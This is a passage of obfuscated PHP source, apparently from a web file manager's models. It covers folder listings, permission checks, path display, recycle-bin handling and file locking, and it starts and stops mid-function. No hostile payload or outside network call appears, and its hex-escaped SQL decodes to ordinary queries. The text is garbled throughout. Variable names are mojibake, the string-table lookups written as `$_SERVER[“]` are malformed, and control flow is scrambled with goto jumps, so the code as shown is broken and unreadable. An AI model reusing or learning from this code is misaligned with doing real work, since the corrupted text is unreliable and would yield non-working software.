$aâˆœî”ƒÍ[$Dìœ„™Ï‘£[391]][$Dìœ„™Ï‘£[433]] = 1; $aâˆœî”ƒÍ[$Dìœ„™Ï‘£[391]][$Dìœ„™Ï‘£[434]] = $FÜÀîÅ¨[$aâˆœî”ƒÍ[$Dìœ„™Ï‘£[369]]][$Dìœ„™Ï‘£[28]]; } if (isset($F…³öòÒ–Ó[$aâˆœî”ƒÍ[$Dìœ„™Ï‘£[369]]])) { $aâˆœî”ƒÍ[$Dìœ„™Ï‘£[391]][$Dìœ„™Ï‘£[435]] = array(); foreach ($F…³öòÒ–Ó[$aâˆœî”ƒÍ[$Dìœ„™Ï‘£[369]]] as $AŒ©õ³êâ‹) { $cœÖŒç×ï— = $Dèï—ª°ƒÑ[$AŒ©õ³êâ‹]; $aâˆœî”ƒÍ[$Dìœ„™Ï‘£[391]][$Dìœ„™Ï‘£[435]][] = array($Dìœ„™Ï‘£[436] => $cœÖŒç×ï—[$Dìœ„™Ï‘£[367]], $Dìœ„™Ï‘£[386] => $cœÖŒç×ï—[$Dìœ„™Ï‘£[28]], $Dìœ„™Ï‘£[437] => $cœÖŒç×ï—[$Dìœ„™Ï‘£[438]]); } } if (isset($b¢˜ŠÀÍÈ­[$aâˆœî”ƒÍ[$Dìœ„™Ï‘£[369]]])) { $aâˆœî”ƒÍ[$Dìœ„™Ï‘£[391]][$Dìœ„™Ï‘£[439]] = array(); foreach ($b¢˜ŠÀÍÈ­[$aâˆœî”ƒÍ[$Dìœ„™Ï‘£[369]]] as $F‰éå±‘íù) { $aâˆœî”ƒÍ[$Dìœ„™Ï‘£[391]][$Dìœ„™Ï‘£[439]] = array($Dìœ„™Ï‘£[440] => $F‰éå±‘íù[$Dìœ„™Ï‘£[441]], $Dìœ„™Ï‘£[442] => $F‰éå±‘íù[$Dìœ„™Ï‘£[443]], $Dìœ„™Ï‘£[444] => $F‰éå±‘íù[$Dìœ„™Ï‘£[369]], $Dìœ„™Ï‘£[445] => $F‰éå±‘íù[$Dìœ„™Ï‘£[446]], $Dìœ„™Ï‘£[447] => $F‰éå±‘íù[$Dìœ„™Ï‘£[448]], $Dìœ„™Ï‘£[449] => $F‰éå±‘íù[$Dìœ„™Ï‘£[449]], $Dìœ„™Ï‘£[450] => $F‰éå±‘íù[$Dìœ„™Ï‘£[450]]); } } } return $Aá‘ŒáìŸê; goto c‡Ø©¦ŒâÏ; D­¼±‹±¤¤: $eÑ×Û¼ùìç = Model($Dìœ„™Ï‘£[392])->listData(); $f–¯Â¥¶…½ = Model($Dìœ„™Ï‘£[381])->listData(); $aç‹‘™œ = Model($Dìœ„™Ï‘£[429])->listSimple(); goto Cµô— Ÿ²‰; Cµô— Ÿ²‰: $Dèï—ª°ƒÑ = array_to_keyvalue($bëçÄ¢Úšö, $Dìœ„™Ï‘£[367]); $F…³öòÒ–Ó = array_to_keyvalue_group($eÑ×Û¼ùìç, $Dìœ„™Ï‘£[75], $Dìœ„™Ï‘£[393]); $FÜÀîÅ¨ = array_to_keyvalue($f–¯Â¥¶…½, $Dìœ„™Ï‘£[75]); goto BïÎ¹¹à†; c‡Ø©¦ŒâÏ: } protected function _listAppendChildren(&$FÆĞÇ»™¹, $cÖÊ˜¿À´‘) { goto fà¦øÀ˜·; fÇ‡„¦–Õß: foreach ($FÆĞÇ»™¹ as &$B¥Í–‘‘Ø³) { if ($B¥Í–‘‘Ø³[$EßÉ‘“ÌÃ–[370]]) { unset($B¥Í–‘‘Ø³[$EßÉ‘“ÌÃ–[372]]); $B¥Í–‘‘Ø³[$EßÉ‘“ÌÃ–[192]] = intval($A¼ĞÔ¡İÆ£[$B¥Í–‘‘Ø³[$EßÉ‘“ÌÃ–[369]] . $EßÉ‘“ÌÃ–[453]][$EßÉ‘“ÌÃ–[454]]); $B¥Í–‘‘Ø³[$EßÉ‘“ÌÃ–[191]] = intval($A¼ĞÔ¡İÆ£[$B¥Í–‘‘Ø³[$EßÉ‘“ÌÃ–[369]] . $EßÉ‘“ÌÃ–[455]][$EßÉ‘“ÌÃ–[454]]); } } goto B¦§ôÃÂ’Š; DïŠéå¢†ğ: $eó´‹ä¿÷Ö = $this->tablePrefix . $this->tableName; for ($D·©ÅáñàŸ = 0; $D·©ÅáñàŸ < $CÇÀ£µÊÌ”; $D·©ÅáñàŸ++) { $DñÏ’‚îêê = intval($FÆĞÇ»™¹[$D·©ÅáñàŸ][$EßÉ‘“ÌÃ–[397]]); if ($FÆĞÇ»™¹[$D·©ÅáñàŸ][$EßÉ‘“ÌÃ–[370]]) { $B†ºé‡—ö = $FÆĞÇ»™¹[$D·©ÅáñàŸ][$EßÉ‘“ÌÃ–[369]]; $Dï«´ù¸±Î .= "\x53\105\114\105\103\124\40\x2a\x20\x46\122\x4f\x4d\x20\x28\x53\x45\x4c\105\103\x54\40\x27{$B†ºé‡—ö}\137\x68\141\x73\106\151\154\x65\47\40\x61\163\40\x68\x61\x73\54\143\x6f\165\156\x74\50\61\x29\x20\141\x73\x20\x68\x61\163\103\x6f\165\x6e\x74\x20\x46\122\117\x4d\40\x60{$eó´‹ä¿÷Ö}\x60\x20\xa\11\11\11\x9\x9\167\x68\x65\162\145\x20\160\141\162\x65\x6e\x74\x49\104\x3d{$B†ºé‡—ö}\40\x61\156\144\x20\x69\163\x46\157\154\144\x65\x72\x3d\x30\40\141\156\144\x20\151\163\x44\145\154\145\x74\x65\75{$DñÏ’‚îêê}\x29\x20\141\163\40\164\142\x31\137{$B†ºé‡—ö}\40\165\156\x69\x6f\156\x20\141\x6c\154\40\12\11\11\x9\x9\11\x53\x45\x4c\105\103\124\40\52\x20\106\x52\117\x4d\x20\x28\x53\x45\114\105\x43\x54\40\47{$B†ºé‡—ö}\x5f\x68\141\x73\106\157\154\144\145\x72\47\x20\141\163\x20\x68\141\x73\106\151\154\x65\54\143\157\x75\x6e\164\x28\x31\51\x20\141\163\40\150\x61\x73\x43\157\x75\x6e\x74\x20\106\122\117\x4d\x20\140{$eó´‹ä¿÷Ö}\140\40\xa\11\11\11\11\11\167\x68\x65\x72\145\x20\160\141\x72\145\156\x74\111\104\75{$B†ºé‡—ö}\x20\141\x6e\x64\x20\151\x73\106\157\154\144\145\x72\x3d\x31\40\x61\x6e\144\40\151\x73\x44\x65\x6c\145\x74\x65\x3d{$DñÏ’‚îêê}\x29\40\141\x73\40\164\x62\62\137{$B†ºé‡—ö}\40\165\x6e\x69\157\x6e\x20\141\x6c\x6c\x20"; } if ((strlen($Dï«´ù¸±Î) >= $f®Ä­‹ƒ§ö || $D·©ÅáñàŸ == $CÇÀ£µÊÌ” - 1) && $Dï«´ù¸±Î) { $Dï«´ù¸±Î = substr($Dï«´ù¸±Î, 0, -strlen($EßÉ‘“ÌÃ–[451])); $e¨†„ã¨Í… = $this->query($Dï«´ù¸±Î); $A¼ĞÔ¡İÆ£ = array_merge($A¼ĞÔ¡İÆ£, $e¨†„ã¨Í…); $Dï«´ù¸±Î = $EßÉ‘“ÌÃ–[33]; } } $A¼ĞÔ¡İÆ£ = array_to_keyvalue($A¼ĞÔ¡İÆ£, $EßÉ‘“ÌÃ–[452]); goto fÇ‡„¦–Õß; a……Õˆ†å: $f®Ä­‹ƒ§ö = 1024 * 50; $FÆĞÇ»™¹ = is_array($FÆĞÇ»™¹) ? $FÆĞÇ»™¹ : array(); $CÇÀ£µÊÌ” = count($FÆĞÇ»™¹); goto DïŠéå¢†ğ; fà¦øÀ˜·: $EßÉ‘“ÌÃ– =& $_SERVER[“]; $Dï«´ù¸±Î = $EßÉ‘“ÌÃ–[361]; $A¼ĞÔ¡İÆ£ = array(); goto a……Õˆ†å; B¦§ôÃÂ’Š: } protected function _listAppendAuth(&$f–š´ëŒ‚§) { goto a–“Üª‘ç; D°”ÜÆ¬¶Û: foreach ($f–š´ëŒ‚§ as $b²¶‡ˆÓ”¹) { if ($b²¶‡ˆÓ”¹[$C«±‰ºÄÖ¯[371]] == self::TYPE_GROUP) { $Eõ¬Ï™ç†[] = $b²¶‡ˆÓ”¹[$C«±‰ºÄÖ¯[369]]; } } if (!$Eõ¬Ï™ç†) { return; } $C¸äšÈÑğÛ = array_to_keyvalue($f–š´ëŒ‚§, $C«±‰ºÄÖ¯[369]); goto dÑôƒ™; dÑôƒ™: $eëÎ²ìåŸ¼ = Model($C«±‰ºÄÖ¯[456])->getSourceList($Eõ¬Ï™ç†, $C¸äšÈÑğÛ); foreach ($f–š´ëŒ‚§ as $cÂî…˜¢¯¶ => &$b²¶‡ˆÓ”¹) { $b²¶‡ˆÓ”¹[$C«±‰ºÄÖ¯[376]] = $eëÎ²ìåŸ¼[$b²¶‡ˆÓ”¹[$C«±‰ºÄÖ¯[369]]]; if (!$b²¶‡ˆÓ”¹[$C«±‰ºÄÖ¯[376]] && $b²¶‡ˆÓ”¹[$C«±‰ºÄÖ¯[371]] == self::TYPE_GROUP) { $b²¶‡ˆÓ”¹[$C«±‰ºÄÖ¯[376]] = Action($C«±‰ºÄÖ¯[457])->pathGroupAuthMake($b²¶‡ˆÓ”¹[$C«±‰ºÄÖ¯[458]]); if (!$b²¶‡ˆÓ”¹[$C«±‰ºÄÖ¯[376]] && !_get($GLOBALS, $C«±‰ºÄÖ¯[459])) { $b²¶‡ˆÓ”¹[$C«±‰ºÄÖ¯[189]] = !1; $b²¶‡ˆÓ”¹[$C«±‰ºÄÖ¯[188]] = !1; } } if ($b²¶‡ˆÓ”¹[$C«±‰ºÄÖ¯[376]]) { $b²¶‡ˆÓ”¹[$C«±‰ºÄÖ¯[189]] = AuthModel::authCheckEdit($b²¶‡ˆÓ”¹[$C«±‰ºÄÖ¯[376]][$C«±‰ºÄÖ¯[377]]); $b²¶‡ˆÓ”¹[$C«±‰ºÄÖ¯[188]] = AuthModel::authCheckView($b²¶‡ˆÓ”¹[$C«±‰ºÄÖ¯[376]][$C«±‰ºÄÖ¯[377]]); } $this->groupPathDisplay($b²¶‡ˆÓ”¹); } goto a”¥Ì©î; a–“Üª‘ç: $C«±‰ºÄÖ¯ =& $_SERVER[“]; if (!defined($C«±‰ºÄÖ¯[427])) { return; } $Eõ¬Ï™ç† = array(); goto D°”ÜÆ¬¶Û; a”¥Ì©î: } public function groupPathDisplay(&$BÏ¶ÏÀ÷Ş˜) { goto Dâ‘†ÃÎšÇ; D«ÌÙÆ¥‘è: $EíÆ¯‚Íøˆ = $this->parentLevelArray($EĞ·ôáºäø[$Bƒë«‰–½[461]]); $fÍ‰Ÿğè— = $Bƒë«‰–½[33]; foreach ($EíÆ¯‚Íøˆ as $fÀõÙÚÃÏ¥) { $E´Ç·Î¾· = Model($Bƒë«‰–½[460])->getInfo($fÀõÙÚÃÏ¥); $fÍ‰Ÿğè— .= $E´Ç·Î¾·[$Bƒë«‰–½[391]][$Bƒë«‰–½[369]] . $Bƒë«‰–½[47]; } goto bí¿œĞÆŠù; bí¿œĞÆŠù: $BÏ¶ÏÀ÷Ş˜[$Bƒë«‰–½[462]] = $EĞ·ôáºäø[$Bƒë«‰–½[463]]; $BÏ¶ÏÀ÷Ş˜[$Bƒë«‰–½[380]] = $EĞ·ôáºäø[$Bƒë«‰–½[461]]; $BÏ¶ÏÀ÷Ş˜[$Bƒë«‰–½[464]] = $EĞ·ôáºäø[$Bƒë«‰–½[465]]; goto c¹Ÿ˜Ë; Dâ‘†ÃÎšÇ: $Bƒë«‰–½ =& $_SERVER[“]; if ($BÏ¶ÏÀ÷Ş˜[$Bƒë«‰–½[371]] != self::TYPE_GROUP) { return; } $EĞ·ôáºäø = Model($Bƒë«‰–½[460])->getInfo($BÏ¶ÏÀ÷Ş˜[$Bƒë«‰–½[458]]); goto D«ÌÙÆ¥‘è; c¹Ÿ˜Ë: $BÏ¶ÏÀ÷Ş˜[$Bƒë«‰–½[466]] = $fÍ‰Ÿğè— . $EĞ·ôáºäø[$Bƒë«‰–½[391]][$Bƒë«‰–½[369]]; goto fè²™¬ŞÀ; fè²™¬ŞÀ: } protected function _listAppendPath(&$aö˜Ë‡³ñ) { goto a®ê­Ñºê; a®ê­Ñºê: $C§ôàÆĞ• =& $_SERVER[“]; $Bì§í£æå‘ = array(); foreach ($aö˜Ë‡³ñ as &$Aããğ’Š‰È) { $Bì§í£æå‘[$Aããğ’Š‰È[$C§ôàÆĞ•[369]]] = $Aããğ’Š‰È[$C§ôàÆĞ•[28]]; $cİ¥ÑäÎìÙ = $this->parentLevelArray($Aããğ’Š‰È[$C§ôàÆĞ•[461]]); array_shift($cİ¥ÑäÎìÙ); foreach ($cİ¥ÑäÎìÙ as $c¦¢‘Ì‡ä†) { if (!isset($Bì§í£æå‘[$c¦¢‘Ì‡ä†])) { $Bì§í£æå‘[$c¦¢‘Ì‡ä†] = 0; } } } goto DÎ±¾¨…î…; eä†æîĞ: $aÙÒÑ…¸Ù† = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($aö˜Ë‡³ñ as &$Aããğ’Š‰È) { goto ağÓ‰ùèÑ; b±µßÒíÛ†: $eÙ¬´»ÙøÀ = trim($Aããğ’Š‰È[$C§ôàÆĞ•[468]], $C§ôàÆĞ•[8]); if ($Aããğ’Š‰È[$C§ôàÆĞ•[463]] == $C§ôàÆĞ•[470] && $eÙ¬´»ÙøÀ) { $Aããğ’Š‰È[$C§ôàÆĞ•[28]] = $eÙ¬´»ÙøÀ; } $this->_listAppendPathRecycle($Aããğ’Š‰È, $cİ¥ÑäÎìÙ, $aÙÒÑ…¸Ù†); goto F®›Ÿ«Ä´; ağÓ‰ùèÑ: $cİ¥ÑäÎìÙ = $this->parentLevelArray($Aããğ’Š‰È[$C§ôàÆĞ•[461]]); $BæÃ£˜ëó‡ = $this->_listAppendPathRoot($Aããğ’Š‰È, $cİ¥ÑäÎìÙ); foreach ($cİ¥ÑäÎìÙ as $c¦¢‘Ì‡ä†) { if (isset($Bì§í£æå‘[$c¦¢‘Ì‡ä†])) { $BæÃ£˜ëó‡ .= $Bì§í£æå‘[$c¦¢‘Ì‡ä†] . $C§ôàÆĞ•[8]; } } goto Bšîäèì; Bšîäèì: if ($cİ¥ÑäÎìÙ) { $BæÃ£˜ëó‡ .= $Aããğ’Š‰È[$C§ôàÆĞ•[28]]; } if ($Aããğ’Š‰È[$C§ôàÆĞ•[370]]) { $BæÃ£˜ëó‡ .= $C§ôàÆĞ•[8]; } $Aããğ’Š‰È[$C§ôàÆĞ•[468]] = str_replace($C§ôàÆĞ•[469], $C§ôàÆĞ•[8], $BæÃ£˜ëó‡); goto b±µßÒíÛ†; F®›Ÿ«Ä´: } goto eƒ„ÈªÎâ; DÎ±¾¨…î…: $fÑ²˜Ò‡  = array(); foreach ($Bì§í£æå‘ as $FŒÎå·ô => $F–Ç†åîÖŠ) { if (!$F–Ç†åîÖŠ) { $fÑ²˜Ò‡ [] = $FŒÎå·ô; } } if ($fÑ²˜Ò‡ ) { $bšÙ³š¥ô™ = array($C§ôàÆĞ•[383] => array($C§ôàÆĞ•[384], $fÑ²˜Ò‡ )); if (count($fÑ²˜Ò‡ ) == 1) { $A›İÑÃ–È– = $this->sourceInfo($fÑ²˜Ò‡ [0]); $A›İÑÃ–È– = is_array($A›İÑÃ–È–) ? array($A›İÑÃ–È–) : !1; } else { $A›İÑÃ–È– = $this->field($C§ôàÆĞ•[467])->where($bšÙ³š¥ô™)->select(); } $d ‹¤µ‘µÍ = array_to_keyvalue($A›İÑÃ–È–, $C§ôàÆĞ•[369], $C§ôàÆĞ•[28]); $Bì§í£æå‘ = array_merge_index($Bì§í£æå‘, $d ‹¤µ‘µÍ); } goto eä†æîĞ; eƒ„ÈªÎâ: } private function _listAppendPathRecycle(&$a”´´¸Ğ©–, $e‘½¢‰´ƒ“, $b™Î®Üâùä) { goto b‚´¯¼¨ö›; bìÌÛ»Ê½³: $dÄÈ­È“Ğ„ = explode($EÂôĞ®£Ä¬[8], trim($a”´´¸Ğ©–[$EÂôĞ®£Ä¬[468]], $EÂôĞ®£Ä¬[8])); $B–ˆòè‰é = implode($EÂôĞ®£Ä¬[8], array_slice($dÄÈ­È“Ğ„, 2)); $a”´´¸Ğ©–[$EÂôĞ®£Ä¬[468]] = $EÂôĞ®£Ä¬[8] . LNG($EÂôĞ®£Ä¬[471]) . $EÂôĞ®£Ä¬[8] . ltrim($B–ˆòè‰é, $EÂôĞ®£Ä¬[8]); goto dÙÓ½¯é˜; b‚´¯¼¨ö›: $EÂôĞ®£Ä¬ =& $_SERVER[“]; if (intval($a”´´¸Ğ©–[$EÂôĞ®£Ä¬[371]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($b™Î®Üâùä, $e‘½¢‰´ƒ“) && $a”´´¸Ğ©–[$EÂôĞ®£Ä¬[369]] != $b™Î®Üâùä) { return; } goto bìÌÛ»Ê½³; dÙÓ½¯é˜: $a”´´¸Ğ©–[$EÂôĞ®£Ä¬[461]] = $EÂôĞ®£Ä¬[472] . implode($EÂôĞ®£Ä¬[47], array_slice($e‘½¢‰´ƒ“, 1)) . $EÂôĞ®£Ä¬[47]; if ($a”´´¸Ğ©–[$EÂôĞ®£Ä¬[369]] == $b™Î®Üâùä) { $a”´´¸Ğ©–[$EÂôĞ®£Ä¬[461]] = $EÂôĞ®£Ä¬[472]; $a”´´¸Ğ©–[$EÂôĞ®£Ä¬[463]] = $EÂôĞ®£Ä¬[470]; $a”´´¸Ğ©–[$EÂôĞ®£Ä¬[28]] = LNG($EÂôĞ®£Ä¬[471]); } $a”´´¸Ğ©–[$EÂôĞ®£Ä¬[473]] = $EÂôĞ®£Ä¬[474]; goto Eîî‡¢šôå; Eîî‡¢šôå: } protected function _listAppendPathRoot(&$E¹š¦Ú˜„Ò, $FêùÑÔÎš®) { $Eì»ÑÈÚˆÄ =& $_SERVER[“]; $b½¼«Œ†ù = $Eì»ÑÈÚˆÄ[33]; if ($E¹š¦Ú˜„Ò[$Eì»ÑÈÚˆÄ[371]] == self::TYPE_USER) { if (defined($Eì»ÑÈÚˆÄ[427]) && $E¹š¦Ú˜„Ò[$Eì»ÑÈÚˆÄ[458]] == USER_ID) { $b½¼«Œ†ù = LNG($Eì»ÑÈÚˆÄ[475]); if (!$FêùÑÔÎš®) { $E¹š¦Ú˜„Ò[$Eì»ÑÈÚˆÄ[28]] = $b½¼«Œ†ù; } } else { $A‘ˆÕÉÇ–½ = Model($Eì»ÑÈÚˆÄ[476])->getInfoSimple($E¹š¦Ú˜„Ò[$Eì»ÑÈÚˆÄ[458]]); $b½¼«Œ†ù = LNG($Eì»ÑÈÚˆÄ[477]) . $Eì»ÑÈÚˆÄ[157] . $A‘ˆÕÉÇ–½[$Eì»ÑÈÚˆÄ[28]] . $Eì»ÑÈÚˆÄ[478]; } } else { if ($E¹š¦Ú˜„Ò[$Eì»ÑÈÚˆÄ[371]] == self::TYPE_GROUP) { $A‘ˆÕÉÇ–½ = Model($Eì»ÑÈÚˆÄ[460])->getInfoSimple($E¹š¦Ú˜„Ò[$Eì»ÑÈÚˆÄ[458]]); $b½¼«Œ†ù = $A‘ˆÕÉÇ–½[$Eì»ÑÈÚˆÄ[28]]; } else { if ($E¹š¦Ú˜„Ò[$Eì»ÑÈÚˆÄ[371]] == self::TYPE_SYSTEM) { $A‘ˆÕÉÇ–½ = $this->sourceInfo($FêùÑÔÎš®[0], !0); $b½¼«Œ†ù = $A‘ˆÕÉÇ–½[$Eì»ÑÈÚˆÄ[28]]; } } } $b½¼«Œ†ù = $b½¼«Œ†ù ? $Eì»ÑÈÚˆÄ[8] . $b½¼«Œ†ù . $Eì»ÑÈÚˆÄ[8] : $Eì»ÑÈÚˆÄ[8]; return $b½¼«Œ†ù; } protected function _listAppendUser(&$Bã¥ŒÅÚ¶Ä) { $FÎÃÚøÎ´Ö =& $_SERVER[“]; $EÌ °ìÑê‡ = array_to_keyvalue($Bã¥ŒÅÚ¶Ä, $FÎÃÚøÎ´Ö[33], $FÎÃÚøÎ´Ö[378]); $f§ˆïöğ®– = array_to_keyvalue($Bã¥ŒÅÚ¶Ä, $FÎÃÚøÎ´Ö[33], $FÎÃÚøÎ´Ö[379]); $cŞÁ„Á¢½» = array_merge($EÌ °ìÑê‡, $f§ˆïöğ®–); $Bã„×¡Öõµ = Model($FÎÃÚøÎ´Ö[479])->userListInfo($cŞÁ„Á¢½»); foreach ($Bã¥ŒÅÚ¶Ä as &$B¿ó×ƒİ¶) { $B¯ÃºõÂÂ­ = $B¿ó×ƒİ¶[$FÎÃÚøÎ´Ö[378]]; $B¿ó×ƒİ¶[$FÎÃÚøÎ´Ö[378]] = $Bã„×¡Öõµ[$B¯ÃºõÂÂ­] ? $Bã„×¡Öõµ[$B¯ÃºõÂÂ­] : !1; $B¯ÃºõÂÂ­ = $B¿ó×ƒİ¶[$FÎÃÚøÎ´Ö[379]]; $B¿ó×ƒİ¶[$FÎÃÚøÎ´Ö[379]] = $Bã„×¡Öõµ[$B¯ÃºõÂÂ­] ? $Bã„×¡Öõµ[$B¯ÃºõÂÂ­] : !1; if (isset($B¿ó×ƒİ¶[$FÎÃÚøÎ´Ö[417]]) && $B¿ó×ƒİ¶[$FÎÃÚøÎ´Ö[417]][$FÎÃÚøÎ´Ö[480]]) { $dß ÁŞ†œµ = $GLOBALS[$FÎÃÚøÎ´Ö[6]][$FÎÃÚøÎ´Ö[84]][$FÎÃÚøÎ´Ö[481]]; if ($B¿ó×ƒİ¶[$FÎÃÚøÎ´Ö[417]][$FÎÃÚøÎ´Ö[482]] <= time() - $dß ÁŞ†œµ) { $this->metaSet($B¿ó×ƒİ¶[$FÎÃÚøÎ´Ö[369]], $FÎÃÚøÎ´Ö[480], null); $this->metaSet($B¿ó×ƒİ¶[$FÎÃÚøÎ´Ö[369]], $FÎÃÚøÎ´Ö[482], null); unset($B¿ó×ƒİ¶[$FÎÃÚøÎ´Ö[417]][$FÎÃÚøÎ´Ö[480]]); continue; } $aº›Æ’ê¸“ = $B¿ó×ƒİ¶[$FÎÃÚøÎ´Ö[417]][$FÎÃÚøÎ´Ö[480]]; $B¿ó×ƒİ¶[$FÎÃÚøÎ´Ö[417]][$FÎÃÚøÎ´Ö[483]] = Model($FÎÃÚøÎ´Ö[479])->getInfoSimpleOuter($aº›Æ’ê¸“); } } } public function parentLevelArray($F®ÂÚ÷¾¼) { $FÊî¹½ØÂ =& $_SERVER[“]; $F®ÂÚ÷¾¼ = explode($FÊî¹½ØÂ[47], trim($F®ÂÚ÷¾¼, $FÊî¹½ØÂ[47])); return array_remove_value($F®ÂÚ÷¾¼, $FÊî¹½ØÂ[470]); } public function listAll($d¬¤Ê½ƒïÈ) { goto c‚”Ó™‚Êã; e»î§§ìº³: $cªŠ—‘§äÍ = array(); foreach ($eò¶ª¼î¦Ø as $ešÒ©“™Š => $AçôòšÚ—ß) { goto C„îŸĞ±É; C¬–°‘¤: for ($dñ·¢Í¿®ì = 0; $dñ·¢Í¿®ì < count($a‹ÔÇ†à”«); $dñ·¢Í¿®ì++) { $eËœŠî“œ .= $eò¶ª¼î¦Ø[$a‹ÔÇ†à”«[$dñ·¢Í¿®ì]][$Fğ¸ï‹Ø¬Ë[28]] . $Fğ¸ï‹Ø¬Ë[8]; } $eËœŠî“œ .= $AçôòšÚ—ß[$Fğ¸ï‹Ø¬Ë[28]]; if ($AçôòšÚ—ß[$Fğ¸ï‹Ø¬Ë[370]]) { $eËœŠî“œ .= $Fğ¸ï‹Ø¬Ë[8]; } goto FÌ¬ÙÜ“óÁ; FÌ¬ÙÜ“óÁ: $eËœŠî“œ = str_replace($Fğ¸ï‹Ø¬Ë[469], $Fğ¸ï‹Ø¬Ë[8], $eËœŠî“œ); $eËœŠî“œ = str_replace($Fğ¸ï‹Ø¬Ë[469], $Fğ¸ï‹Ø¬Ë[8], $eËœŠî“œ); $AŸ—’¡ ‰… = array($Fğ¸ï‹Ø¬Ë[387] => str_replace($Fğ¸ï‹Ø¬Ë[469], $Fğ¸ï‹Ø¬Ë[8], $eËœŠî“œ), $Fğ¸ï‹Ø¬Ë[490] => intval($AçôòšÚ—ß[$Fğ¸ï‹Ø¬Ë[370]]), $Fğ¸ï‹Ø¬Ë[391] => $this->pathInfoFilter($AçôòšÚ—ß, !0)); goto b„‘‡ÉíÕ¨; C„îŸĞ±É: $a‹ÔÇ†à”« = $this->parentLevelArray($AçôòšÚ—ß[$Fğ¸ï‹Ø¬Ë[461]]); array_shift($a‹ÔÇ†à”«); $eËœŠî“œ = $C†•ì˜‡‹—; goto C¬–°‘¤; b„‘‡ÉíÕ¨: if (!$AçôòšÚ—ß[$Fğ¸ï‹Ø¬Ë[370]]) { $AŸ—’¡ ‰…[$Fğ¸ï‹Ø¬Ë[419]] = $AçôòšÚ—ß[$Fğ¸ï‹Ø¬Ë[419]]; $AŸ—’¡ ‰…[$Fğ¸ï‹Ø¬Ë[491]] = $AçôòšÚ—ß[$Fğ¸ï‹Ø¬Ë[75]]; } $cªŠ—‘§äÍ[] = $AŸ—’¡ ‰…; goto DÉì‹×óàõ; DÉì‹×óàõ: } return $cªŠ—‘§äÍ; goto Eˆ„ÙÏî; fëŸ—‘¬ÚÕ: $this->_listAppendAuth($eò¶ª¼î¦Ø); $this->_listAppendUser($eò¶ª¼î¦Ø); $this->_listAppendPath($eò¶ª¼î¦Ø); goto f”êÃ’õÊé; f”êÃ’õÊé: $eò¶ª¼î¦Ø = array_to_keyvalue($eò¶ª¼î¦Ø, $Fğ¸ï‹Ø¬Ë[369]); $C†•ì˜‡‹— = "\x2f{$eç²ƒÀ©¨Ö[$Fğ¸ï‹Ø¬Ë[28]]}\57"; $C†•ì˜‡‹— = $C†•ì˜‡‹— == $Fğ¸ï‹Ø¬Ë[469] ? $Fğ¸ï‹Ø¬Ë[8] : $C†•ì˜‡‹—; goto e»î§§ìº³; c‚”Ó™‚Êã: $Fğ¸ï‹Ø¬Ë =& $_SERVER[“]; $eç²ƒÀ©¨Ö = $this->sourceInfo($d¬¤Ê½ƒïÈ); $F‹šç½ÖØÆ = array($Fğ¸ï‹Ø¬Ë[484] => array($Fğ¸ï‹Ø¬Ë[485], $eç²ƒÀ©¨Ö[$Fğ¸ï‹Ø¬Ë[461]] . $d¬¤Ê½ƒïÈ . $Fğ¸ï‹Ø¬Ë[486]), $Fğ¸ï‹Ø¬Ë[487] => 0); goto Dõà˜¥”œ»; Dõà˜¥”œ»: $aŞ¸Æƒ’Êƒ = $Fğ¸ï‹Ø¬Ë[488]; $E•î¥Ğõ½ = "\x4c\105\106\x54\x20\x4a\117\x49\116\40{$this->tablePrefix}\151\x6f\x5f\x66\151\154\145\40\x66\x69\154\145\40\157\x6e\40\x73\x6f\165\162\143\145\56\x66\x69\x6c\145\111\x44\x20\75\40\x66\x69\x6c\145\x2e\146\151\x6c\x65\x49\x44"; $eò¶ª¼î¦Ø = $this->alias($Fğ¸ï‹Ø¬Ë[489])->field($aŞ¸Æƒ’Êƒ)->where($F‹šç½ÖØÆ)->join($E•î¥Ğõ½)->select(); goto fëŸ—‘¬ÚÕ; Eˆ„ÙÏî: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($fõ«àå…Êê) { goto F‘Û»˜Ôø”; e¥…®Šß•í: $f¾å“çä±ã = 1; $this->_lockEvent($fõ«àå…Êê, array($E•‚Â­ª·ˆ[493], $E•‚Â­ª·ˆ[494]), $f¾å“çä±ã); $this->_lockParent($fõ«àå…Êê, array($E•‚Â­ª·ˆ[494]), $f¾å“çä±ã); goto D¬ÜÒ–¨Ÿ; D¬ÜÒ–¨Ÿ: $this->_lockEvent($fõ«àå…Êê, array($E•‚Â­ª·ˆ[495], $E•‚Â­ª·ˆ[496]), $f¾å“çä±ã); $this->_lockCheckEnd($E•‚Â­ª·ˆ[492], $fõ«àå…Êê); goto F¡óŠÓŒÙ†; F‘Û»˜Ôø”: $E•‚Â­ª·ˆ =& $_SERVER[“]; if (!$this->allowLock()) { return; } $this->_lockCheck($E•‚Â­ª·ˆ[492], $fõ«àå…Êê); goto e¥…®Šß•í; F¡óŠÓŒÙ†: } public function lockCopyEnd($dÈ¬êÖğ„) { $fô„Æ„Ñ‹Ú =& $_SERVER[“]; if (!$this->allowLock()) { return; } $cÓ±Ì±ˆÒ = 0; $this->_lockEvent($dÈ¬êÖğ„, array($fô„Æ„Ñ‹Ú[493], $fô„Æ„Ñ‹Ú[494]), $cÓ±Ì±ˆÒ); $this->_lockParent($dÈ¬êÖğ„, array($fô„Æ„Ñ‹Ú[494]), $cÓ±Ì±ˆÒ); $this->_lockEvent($dÈ¬êÖğ„, array($fô„Æ„Ñ‹Ú[495], $fô„Æ„Ñ‹Ú[496]), $cÓ±Ì±ˆÒ); } public function lockWriteStart($A“±éªÂË, $CÇ–æÆµÄ = '') { goto eãõÕ…ËÁÆ; e¯¤ËŠ·: $this->_lockParent($A“±éªÂË, array($DÕ–ŒÓÊß™[492], $DÕ–ŒÓÊß™[494]), $fË‚Â¿õ…¤); $this->_lockCheckEnd($DÕ–ŒÓÊß™[493], $A“±éªÂË); goto e¤Õ Ë‹Œ°; eãõÕ…ËÁÆ: $DÕ–ŒÓÊß™ =& $_SERVER[“]; if (!$this->allowLock()) { return; } $this->_lockCheck($DÕ–ŒÓÊß™[493], $A“±éªÂË); goto dºÃ”×¤¸È; dºÃ”×¤¸È: $fË‚Â¿õ…¤ = 1; $this->_lockKey($DÕ–ŒÓÊß™[497] . $A“±éªÂË . $DÕ–ŒÓÊß™[91] . $CÇ–æÆµÄ, $fË‚Â¿õ…¤); $this->_lockEvent($A“±éªÂË, array($DÕ–ŒÓÊß™[492], $DÕ–ŒÓÊß™[494]), $fË‚Â¿õ…¤); goto e¯¤ËŠ·; e¤Õ Ë‹Œ°: } public function 